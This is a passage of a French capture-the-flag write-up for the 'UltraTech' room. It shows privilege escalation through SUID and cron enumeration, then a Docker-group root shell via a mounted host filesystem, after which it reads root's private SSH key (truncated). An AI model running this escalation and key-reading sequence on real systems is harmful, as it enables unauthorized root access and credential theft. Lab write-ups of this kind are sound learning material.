- Notre utilisateur ne dispose pas des permissions **sudo**
- L’utilisateur `r00t` semble être le seul disponible sur le système

Bien maintenant essayons de chercher des fichiers appartenant à l’utilisateur `root` (admin) avec la permission SUID d’activée :

```bash
r00t@ultratech-prod:~$ find / -type f -perm -4000 -user root 2>/dev/null 
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/gpasswd
/bin/su
/bin/mount
/bin/ping
/bin/ntfs-3g
/bin/fusermount
/bin/umount
/snap/core/6350/bin/mount
/snap/core/6350/bin/ping
/snap/core/6350/bin/ping6
/snap/core/6350/bin/su
/snap/core/6350/bin/umount
/snap/core/6350/usr/bin/chfn
/snap/core/6350/usr/bin/chsh
/snap/core/6350/usr/bin/gpasswd
/snap/core/6350/usr/bin/newgrp
/snap/core/6350/usr/bin/passwd
/snap/core/6350/usr/bin/sudo
/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6350/usr/lib/openssh/ssh-keysign
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6350/usr/sbin/pppd
/snap/core/6531/bin/mount
/snap/core/6531/bin/ping
/snap/core/6531/bin/ping6
/snap/core/6531/bin/su
/snap/core/6531/bin/umount
/snap/core/6531/usr/bin/chfn
/snap/core/6531/usr/bin/chsh
/snap/core/6531/usr/bin/gpasswd
/snap/core/6531/usr/bin/newgrp
/snap/core/6531/usr/bin/passwd
/snap/core/6531/usr/bin/sudo
/snap/core/6531/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6531/usr/lib/openssh/ssh-keysign
/snap/core/6531/usr/lib/snapd/snap-confine
/snap/core/6531/usr/sbin/pppdx
```

La sortie peut paraitre conséquente mais il n’y a néanmoins aucun fichier SUID qui pourrait nous permettre d’élever nos privilèges.

J’ai ensuite effectué des recherches sur les fichiers que notre utilisateur pouvait lire et modifier mais je n’ai rien trouvé d’intéressant.

```bash
r00t@ultratech-prod:~$ find / -type f -readable 2>/dev/null
r00t@ultratech-prod:~$ find / -type f -writeable 2>/dev/null
```

Je me suis ensuite tourné vers les **cronjobs** qui sont enfaite des tâches automatisées (similaires aux tâches sous Windows). 

Ces cronjobs, si mal configurés au niveau des permissions utilisateurs, peuvent être exploiter en modifiant le contenu d’un fichier exécuté automatiquement par exemple.

```bash
r00t@ultratech-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

Mais là encore je n’ai rien trouvé d’intéressant.

Après avoir passé un peu de temps à chercher des informations un peu partout sur le système, je me suis rappelé que notre utilisateur fait partie du groupe `docker`.

Je me suis alors renseigné sur des escalades de privilèges via Docker et j’ai trouvé ceci sur Gtfobins :

Lien : [Docker privesc](https://gtfobins.github.io/gtfobins/docker/)

Je me suis alors demandé si cet exploit pourrait fonctionner dans notre situation.

D’abord vérifions si nous disposons d’une image Docker :

```bash
r00t@ultratech-prod:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        6 years ago         15.8MB
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# whoami 
root
```

Parfait, une image “bash” semble être disponible sur la machine.

Essayons d’exécuter la commande de GtfoBins sur notre image `bash`

```bash
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
```

Et voilà ! Nous avons réussi à obtenir un shell `root` !

Il ne nous reste plus qu’à récupérer les 9 premiers caractères de la clé privée SSH de l’utilisateur et nous aurons terminer la room **UltraTech** !

```bash
# pwd
/
# cd root
# ls
private.txt
# cat private.txt
# Life and acomplishments of Alvaro Squalo - Tome I

Memoirs of the most successful digital nomdad finblocktech entrepreneur
in the world.

By himself.

## Chapter 1 - How I became successful

# ls -la
total 40
drwx------  6 root root 4096 Mar 22  2019 .
drwxr-xr-x 23 root root 4096 Mar 19  2019 ..
-rw-------  1 root root  844 Mar 22  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Mar 22  2019 .cache
drwx------  3 root root 4096 Mar 22  2019 .emacs.d
drwx------  3 root root 4096 Mar 22  2019 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root    0 Mar 22  2019 .python_history
drwx------  2 root root 4096 Mar 22  2019 .ssh
-rw-rw-rw-  1 root root  193 Mar 22  2019 private.txt
# cd .ssh
# ls
authorized_keys  id_rsa  id_rsa.pub
# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBA
...
-----END RSA PRIVATE KEY-----
```

### Q9 - Quels sont les 9 premiers caractères de la clé SSH privée de l'utilisateur root ?

Réponse : `MIIEogIBA`

![4.png](./screenshots/4.png)

Félicitations pour avoir terminé la room UtlraTech 🥳 !

## Conclusion

Cette room concernait l'exploitation d'un serveur web NodeJS via une API REST vulnérable à l’injection de commandes. Dans un premier temps nous avons effectué une reconnaissance simple, puis investigué plus en profondeur. Nous avons ensuite découvert un endpoint API vulnérable à l’injection de commande qui nous a permit d’obtenir des identifiants sur la machine cible et de nous y connecter via SSH. Pour terminer, nous avons réussi à élever nos privilèges en tant que `root` à l’aide de Docker.

À travers cette room, j'ai compris à quel point il est important d'utiliser un mot de passe fort et de maintenir les services utilisés à jour. Cela m'a également aidé à acquérir plus de connaissances pratiques en matière de pentest Web (dumoins sur WordPress).

## Remerciements

Si vous êtes arrivé jusqu'ici — merci ! Le partage des connaissances est ce qui rend la communauté CTF vraiment géniale.

J'espère que ce write-up a été utile ou au moins intéressant. Et souvenez-vous :

*Every vulnerability is a lesson in disguise—the more we break, the more we understand how to build.*